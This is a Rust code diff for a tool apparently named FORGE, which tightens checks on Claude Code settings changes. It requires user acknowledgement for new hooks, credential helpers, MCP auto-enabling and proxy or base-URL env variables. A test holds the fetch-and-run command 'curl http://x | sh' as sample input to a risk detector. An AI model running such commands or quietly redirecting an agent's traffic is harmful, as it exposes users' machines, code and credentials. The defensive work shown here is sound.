@@ -80,41 +80,89 @@ pub fn validate_settings(text: &str) -> Result<(Value, Vec<HookRisk>)> {
     Ok((v, risks))
 }
 
-fn hook_key(event: &str, hook: &Value) -> String {
-    format!("{event}::{hook}")
+/// Settings keys whose value is a command Claude Code runs on its own schedule (credential helpers, status line, file
+/// suggestions). They execute code just like hooks, so adding or changing one needs the same acknowledgement.
+const COMMAND_KEYS: &[&str] = &["apiKeyHelper", "awsCredentialExport", "awsAuthRefresh", "gcpAuthRefresh", "otelHeadersHelper", "proxyAuthHelper", "statusLine", "fileSuggestion"];
+
+/// `env` entries that redirect where the agent's traffic goes or what it trusts.
+fn risky_env_key(k: &str) -> bool {
+    let u = k.to_uppercase();
+    u.ends_with("_BASE_URL") || u.ends_with("_PROXY") || u == "NODE_EXTRA_CA_CERTS" || u == "NODE_TLS_REJECT_UNAUTHORIZED" || u.starts_with("ANTHROPIC_") && u.contains("URL")
 }
 
-/// Validate the `settings.json` text FORGE is about to write over `before`. Hooks that are byte-for-byte unchanged from
-/// `before` are grandfathered: they were not authored by this edit, so their problems (a missing timeout, a risky command)
-/// are reported as warnings and do not block unrelated changes. New or modified hooks must pass in full.
+/// Fields of a command hook FORGE can show, test and reason about. Anything else (`args`, `shell`, ...) changes how the
+/// command is executed in ways the preview and the dry-run would not reflect, so FORGE will not create or change it.
+pub const PLAIN_HOOK_FIELDS: &[&str] = &["type", "command", "timeout", "if", "onFailure", "statusMessage"];
+
+/// Identity of a hook for "is this the same hook as before": event, the group's matcher, and the complete hook object.
+fn hook_key(event: &str, matcher: &str, hook: &Value) -> String {
+    format!("{event}::{matcher}::{hook}")
+}
+
+const DEFAULT_HOOK_RISK: &str = "Runs on your machine with your privileges every time the event fires. FORGE cannot tell what the command or any script it calls will do.";
+
+/// Hook-shaped inventory of a settings document: (event, matcher, hook object) in file order.
+fn hooks_of(v: &Value) -> Vec<(String, String, Value)> {
+    let mut out = vec![];
+    if let Some(map) = v.pointer("/hooks").and_then(Value::as_object) {
+        for (event, groups) in map {
+            for g in groups.as_array().into_iter().flatten() {
+                let matcher = g.get("matcher").and_then(Value::as_str).unwrap_or("").to_string();
+                for h in g.get("hooks").and_then(Value::as_array).into_iter().flatten() {
+                    out.push((event.clone(), matcher.clone(), h.clone()));
+                }
+            }
+        }
+    }
+    out
+}
+
+fn command_of(v: &Value) -> String {
+    match v {
+        Value::String(s) => s.clone(),
+        Value::Object(o) => o.get("command").and_then(Value::as_str).map(String::from).unwrap_or_else(|| v.to_string()),
+        other => other.to_string(),
+    }
+}
+
+/// Validate the `settings.json` text FORGE is about to write over `before`.
+///
+/// * A hook that is unchanged from `before` — same event, same group matcher, same definition, counted as a multiset — is
+///   *grandfathered*: its problems are warnings and it never needs a fresh acknowledgement.
+/// * Every new or modified hook (including an old one whose matcher changed, one copied into another group, or any hook once
+///   `disableAllHooks` is switched off) must pass in full, may only use fields FORGE can show and test, and always produces
+///   an entry in the returned risks so the user has to acknowledge it, whatever the heuristics found.
+/// * Other command-running settings (credential helpers, `statusLine`, `fileSuggestion`), traffic-redirecting `env` entries
+///   and `enableAllProjectMcpServers` get the same treatment.
 pub fn validate_settings_change(before: Option<&str>, after: &str) -> Result<(Value, Vec<HookRisk>, Vec<String>)> {
     let v: Value = serde_json::from_str(after).map_err(|e| ForgeError::Other(format!("settings.json is not valid JSON: {e}")))?;
     let Some(obj) = v.as_object() else {
         return Err(ForgeError::Other("settings.json must be a JSON object".into()));
     };
-    let mut known: std::collections::HashSet<String> = Default::default();
-    let mut known_events: std::collections::HashSet<String> = Default::default();
-    if let Some(prev) = before.and_then(|b| serde_json::from_str::<Value>(b).ok()) {
-        if let Some(map) = prev.pointer("/hooks").and_then(Value::as_object) {
-            for (event, groups) in map {
-                known_events.insert(event.clone());
-                for g in groups.as_array().into_iter().flatten() {
-                    for h in g.get("hooks").and_then(Value::as_array).into_iter().flatten() {
-                        known.insert(hook_key(event, h));
-                    }
-                }
-            }
-        }
-    }
+    let prev: Value = before.and_then(|b| serde_json::from_str(b).ok()).unwrap_or(Value::Null);
+
     let mut risks = vec![];
     let mut warnings = vec![];
+
+    // Hooks that were switched off and are about to be switched on are all new again.
+    let reactivated = prev.get("disableAllHooks").and_then(Value::as_bool) == Some(true) && obj.get("disableAllHooks").and_then(Value::as_bool) != Some(true);
+    let mut known: std::collections::HashMap<String, usize> = Default::default();
+    if !reactivated {
+        for (e, m, h) in hooks_of(&prev) {
+            *known.entry(hook_key(&e, &m, &h)).or_default() += 1;
+        }
+    } else if !hooks_of(&prev).is_empty() {
+        warnings.push("This change switches hooks back on (`disableAllHooks`); every hook in the file is treated as new and listed below.".into());
+    }
+
     if let Some(hooks) = obj.get("hooks") {
         let Some(map) = hooks.as_object() else {
             return Err(ForgeError::Other("`hooks` must be an object".into()));
         };
         for (event, groups) in map {
             if !CLAUDE_HOOK_EVENTS.contains(&event.as_str()) {
-                if known_events.contains(event) {
+                // An unknown event is inert. It may stay only if it is exactly what was there; creating or editing one is a typo.
+                if prev.pointer("/hooks").and_then(|h| h.get(event)) == Some(groups) {
                     warnings.push(format!("`{event}` is not a Claude hook event (names are exact and case-sensitive); it was already there and is left unchanged."));
                     continue;
                 }
@@ -127,13 +175,28 @@ pub fn validate_settings_change(before: Option<&str>, after: &str) -> Result<(Va
                 let Some(list) = g.get("hooks").and_then(Value::as_array) else {
                     return Err(ForgeError::Other(format!("every entry under hooks.{event} needs a `hooks` list")));
                 };
+                let matcher = g.get("matcher").and_then(Value::as_str).unwrap_or("");
                 for h in list {
+                    let key = hook_key(event, matcher, h);
+                    let grandfathered = match known.get_mut(&key) {
+                        Some(n) if *n > 0 => {
+                            *n -= 1;
+                            true
+                        }
+                        _ => false,
+                    };
                     let kind = h.get("type").and_then(Value::as_str).unwrap_or("command");
-                    if kind != "command" {
-                        continue; // other hook types are preserved as-is, not authored by FORGE
+                    let plain = kind == "command" && h.as_object().is_some_and(|o| o.keys().all(|k| PLAIN_HOOK_FIELDS.contains(&k.as_str())));
+                    if !plain {
+                        if grandfathered {
+                            warnings.push(format!("An existing {event} hook uses a form FORGE cannot fully show or test (type `{kind}` or extra fields such as `args`/`shell`); it is left unchanged and cannot be dry-run here."));
+                            continue;
+                        }
+                        return Err(ForgeError::Other(format!(
+                            "FORGE only creates or changes plain command hooks (type \"command\" with command, timeout, if, onFailure, statusMessage); this {event} hook uses `{kind}` or extra fields such as `args`, `shell` or `url`. Edit that form in your own editor."
+                        )));
                     }
                     let cmd = h.get("command").and_then(Value::as_str).unwrap_or("");
-                    let grandfathered = known.contains(&hook_key(event, h));
                     let checked = (|| -> Result<Vec<String>> {
                         let r = validate_command(cmd)?;
                         match h.get("timeout") {
@@ -143,7 +206,7 @@ pub fn validate_settings_change(before: Option<&str>, after: &str) -> Result<(Va
                         }
                         Ok(r)
                     })();
-                    let r = match checked {
+                    let heuristics = match checked {
                         Ok(r) => r,
                         Err(e) if grandfathered => {
                             warnings.push(format!("Existing {event} hook `{}` has a problem and is left unchanged: {e}", display_command(cmd)));
@@ -151,11 +214,55 @@ pub fn validate_settings_change(before: Option<&str>, after: &str) -> Result<(Va
                         }
                         Err(e) => return Err(e),
                     };
-                    if !r.is_empty() && !grandfathered {
+                    if !grandfathered {
+                        let mut r = vec![DEFAULT_HOOK_RISK.to_string()];
+                        r.extend(heuristics);
                         risks.push(HookRisk { event: event.clone(), command: cmd.to_string(), display: display_command(cmd), risks: r });
                     }
                 }
             }
+        }
+    }
+
+    // Other settings that make Claude Code run something.
+    for key in COMMAND_KEYS {
+        let now = obj.get(*key);
+        if let Some(now) = now.filter(|n| !n.is_null()) {
+            if prev.get(*key) != Some(now) {
+                let cmd = command_of(now);
+                if cmd.trim().is_empty() || validate_command(&cmd).is_err() {
+                    return Err(ForgeError::Other(format!("`{key}` must be a single-line command with no hidden characters")));
+                }
+                risks.push(HookRisk {
+                    event: format!("settings.{key}"),
+                    command: cmd.clone(),
+                    display: display_command(&cmd),
+                    risks: vec![format!("`{key}` makes Claude Code run this command on your machine with your privileges; it is not a hook but it executes just the same.")],
+                });
+            }
+        }
+    }
+    if obj.get("enableAllProjectMcpServers").and_then(Value::as_bool) == Some(true) && prev.get("enableAllProjectMcpServers").and_then(Value::as_bool) != Some(true) {
+        risks.push(HookRisk {
+            event: "settings.enableAllProjectMcpServers".into(),
+            command: "enableAllProjectMcpServers: true".into(),
+            display: "enableAllProjectMcpServers: true".into(),
+            risks: vec!["Lets every server in .mcp.json start without asking, and each one launches a program (or talks to a URL) with your privileges.".into()],
+        });
+    }
+    if let Some(env) = obj.get("env").and_then(Value::as_object) {
+        let old = prev.get("env").and_then(Value::as_object);
+        let changed: Vec<&String> = env.iter().filter(|(k, val)| old.and_then(|o| o.get(*k)) != Some(*val)).map(|(k, _)| k).collect();
+        if !changed.is_empty() {
+            warnings.push(format!("This change sets environment variable(s) for Claude Code sessions: {}.", changed.iter().map(|k| k.as_str()).collect::<Vec<_>>().join(", ")));
+        }
+        for k in changed.into_iter().filter(|k| risky_env_key(k)) {
+            risks.push(HookRisk {
+                event: "settings.env".into(),
+                command: format!("{k}={}", env.get(k).map(|x| x.to_string()).unwrap_or_default()),
+                display: format!("{k}={}", env.get(k).map(|x| x.to_string()).unwrap_or_default()),
+                risks: vec!["Changes where Claude Code sends its traffic or which certificates it trusts, which can expose prompts, code and credentials.".into()],
+            });
         }
     }
     Ok((v, risks, warnings))
@@ -312,10 +419,12 @@ pub fn render_template(id: &str, params: &std::collections::HashMap<String, Stri
         safe_param(params.get(k).map(String::as_str).unwrap_or(&d))
     };
     let command = match id {
-        "format-after-edit" => "node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{const p=JSON.parse(d).tool_input.file_path;if(p)require('child_process').spawnSync('npx',['--no-install','prettier','--write',p],{stdio:'ignore',shell:process.platform==='win32'})}catch(e){}})\"".to_string(),
+        // No shell, no `npx`: the file name comes from the agent and may contain `&`, spaces or a leading `-`. Prettier's own
+        // entry point is run by this Node with an argument array and an absolute path, and only for files inside the project.
+        "format-after-edit" => "node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{const fs=require('fs'),path=require('path'),cp=require('child_process');const root=path.resolve(process.env.CLAUDE_PROJECT_DIR||process.cwd());const p=path.resolve(root,String(JSON.parse(d).tool_input.file_path||''));const rel=path.relative(root,p);const bin=['bin/prettier.cjs','bin-prettier.js'].map(b=>path.join(root,'node_modules','prettier',b)).find(b=>fs.existsSync(b));if(bin&&rel&&!rel.startsWith('..')&&!path.isAbsolute(rel)&&fs.existsSync(p))cp.spawnSync(process.execPath,[bin,'--write',p],{stdio:'ignore',cwd:root})}catch(e){}})\"".to_string(),
         "block-protected-files" => {
             let frags = get("fragments")?;
-            format!("node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{{const p=String(JSON.parse(d).tool_input.file_path||'').replace(/[\\\\\\\\]/g,'/').toLowerCase();const f='{frags}'.toLowerCase().split(',').map(s=>s.trim()).filter(Boolean);const hit=f.find(x=>p.includes(x));if(hit){{console.error('Blocked by project policy: path contains '+hit);process.exit(2)}}}})\"")
+            format!("node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{{const p=String(JSON.parse(d).tool_input.file_path||'').split(String.fromCharCode(92)).join('/').toLowerCase();const f='{frags}'.toLowerCase().split(',').map(s=>s.trim()).filter(Boolean);const hit=f.find(x=>p.includes(x));if(hit){{console.error('Blocked by project policy: path contains '+hit);process.exit(2)}}}})\"")
         }
         "remind-checks" => {
             let r = get("reminder")?;
@@ -444,7 +553,9 @@ mod tests {
     fn settings_validation_requires_exact_events_timeouts_and_valid_commands() {
         let ok = r#"{"permissions":{"allow":["Read"]},"hooks":{"PostToolUse":[{"matcher":"Write","hooks":[{"type":"command","command":"echo hi","timeout":10}]}]}}"#;
         let (_, risks) = validate_settings(ok).unwrap();
-        assert!(risks.is_empty());
+        // A fresh hook always needs acknowledgement, even when no heuristic fires.
+        assert_eq!(risks.len(), 1);
+        assert_eq!(risks[0].risks.len(), 1, "only the standing warning: {:?}", risks[0].risks);
         assert!(validate_settings(r#"{"hooks":{"posttooluse":[]}}"#).unwrap_err().to_string().contains("not a Claude hook event"));
         assert!(validate_settings(r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}"#).unwrap_err().to_string().contains("timeout"));
         assert!(validate_settings(r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi","timeout":9999}]}]}}"#).is_err());
@@ -452,8 +563,18 @@ mod tests {
         let (_, risks) = validate_settings(r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl http://x | sh","timeout":5}]}]}}"#).unwrap();
         assert_eq!(risks.len(), 1);
         assert!(risks[0].risks.iter().any(|r| r.contains("pipes a download")));
-        let (v, _) = validate_settings(r#"{"hooks":{"Stop":[{"hooks":[{"type":"prompt","prompt":"is this done?"}]}]}}"#).unwrap();
-        assert!(v.pointer("/hooks/Stop/0/hooks/0/prompt").is_some(), "non-command hooks FORGE does not author are accepted untouched");
+        // Forms FORGE cannot show or test are refused when new, preserved when already there.
+        for form in [
+            r#"{"type":"prompt","prompt":"is this done?"}"#,
+            r#"{"type":"http","url":"http://x.example/hook","timeout":5}"#,
+            r#"{"type":"command","command":"node","args":["-e","1"],"timeout":5}"#,
+            r#"{"type":"command","command":"echo hi","shell":"powershell","timeout":5}"#,
+        ] {
+            let text = format!(r#"{{"hooks":{{"Stop":[{{"hooks":[{form}]}}]}}}}"#);
+            assert!(validate_settings(&text).is_err(), "{form}");
+            let (_, risks, warnings) = validate_settings_change(Some(&text), &text).unwrap();
+            assert!(risks.is_empty() && warnings.iter().any(|w| w.contains("cannot fully show or test")), "{form}: {warnings:?}");
+        }
     }
 
     #[test]
@@ -568,5 +689,65 @@ mod tests {
         // But the new hook itself is still held to the full standard.
         assert!(add_hook(Some(before), "Stop", None, "echo a
 echo b", 10).is_err());
+    }
+
+    const BEFORE_RISKY: &str = r#"{"hooks":{"PostToolUse":[{"matcher":"NoSuchTool","hooks":[{"type":"command","command":"node scripts/check.cjs","timeout":10}]}]}}"#;
+
+    #[test]
+    fn changing_when_a_hook_fires_makes_it_new_again() {
+        // Matcher widened: same hook object, different activation.
+        let widened = BEFORE_RISKY.replace("NoSuchTool", "*");
+        let (_, risks, _) = validate_settings_change(Some(BEFORE_RISKY), &widened).unwrap();
+        assert_eq!(risks.len(), 1, "a re-targeted hook must be re-acknowledged");
+        // The same hook copied into a second group is a new instance.
+        let copied = r#"{"hooks":{"PostToolUse":[{"matcher":"NoSuchTool","hooks":[{"type":"command","command":"node scripts/check.cjs","timeout":10}]},{"matcher":"Write","hooks":[{"type":"command","command":"node scripts/check.cjs","timeout":10}]}]}}"#;
+        assert_eq!(validate_settings_change(Some(BEFORE_RISKY), copied).unwrap().1.len(), 1);
+        // Duplicated within one group: multiplicity counts.
+        let twice = r#"{"hooks":{"PostToolUse":[{"matcher":"NoSuchTool","hooks":[{"type":"command","command":"node scripts/check.cjs","timeout":10},{"type":"command","command":"node scripts/check.cjs","timeout":10}]}]}}"#;
+        assert_eq!(validate_settings_change(Some(BEFORE_RISKY), twice).unwrap().1.len(), 1);
+        // Unchanged is quiet.
+        assert!(validate_settings_change(Some(BEFORE_RISKY), BEFORE_RISKY).unwrap().1.is_empty());
+    }
+
+    #[test]
+    fn switching_hooks_back_on_re_reviews_every_hook() {
+        let off = r#"{"disableAllHooks":true,"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo done","timeout":5}]}]}}"#;
+        let on = r#"{"disableAllHooks":false,"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo done","timeout":5}]}]}}"#;
+        let (_, risks, warnings) = validate_settings_change(Some(off), on).unwrap();
+        assert_eq!(risks.len(), 1);
+        assert!(warnings.iter().any(|w| w.contains("switches hooks back on")));
+        assert!(validate_settings_change(Some(off), off).unwrap().1.is_empty());
+    }
+
+    #[test]
+    fn an_edited_unknown_event_is_refused_but_an_untouched_one_survives() {
+        let before = r#"{"hooks":{"posttool":[{"hooks":[{"type":"command","command":"echo a","timeout":5}]}]}}"#;
+        assert!(validate_settings_change(Some(before), before).is_ok());
+        let edited = before.replace("echo a", "echo b");
+        assert!(validate_settings_change(Some(before), &edited).is_err());
+    }
+
+    #[test]
+    fn other_command_running_settings_need_acknowledgement() {
+        for (settings, key) in [
+            (r#"{"apiKeyHelper":"node get-key.js"}"#, "apiKeyHelper"),
+            (r#"{"statusLine":{"type":"command","command":"node status.js"}}"#, "statusLine"),
+            (r#"{"awsAuthRefresh":"aws sso login"}"#, "awsAuthRefresh"),
+            (r#"{"fileSuggestion":{"type":"command","command":"node files.js"}}"#, "fileSuggestion"),
+            (r#"{"enableAllProjectMcpServers":true}"#, "enableAllProjectMcpServers"),
+            (r#"{"env":{"ANTHROPIC_BASE_URL":"http://127.0.0.1:9999"}}"#, "env"),
+            (r#"{"env":{"HTTPS_PROXY":"http://proxy.example:8080"}}"#, "env"),
+        ] {
+            let (_, risks, _) = validate_settings_change(None, settings).unwrap();
+            assert_eq!(risks.len(), 1, "{settings}");
+            assert!(risks[0].event.contains(key), "{settings}: {}", risks[0].event);
+            // Unchanged on a later edit: quiet.
+            assert!(validate_settings_change(Some(settings), settings).unwrap().1.is_empty(), "{settings}");
+        }
+        // A harmless env entry only warns; a multi-line helper is refused outright.
+        let (_, risks, warnings) = validate_settings_change(None, r#"{"env":{"FOO":"1"}}"#).unwrap();
+        assert!(risks.is_empty() && !warnings.is_empty());
+        assert!(validate_settings_change(None, r#"{"apiKeyHelper":"a
+b"}"#).is_err());
     }
 }
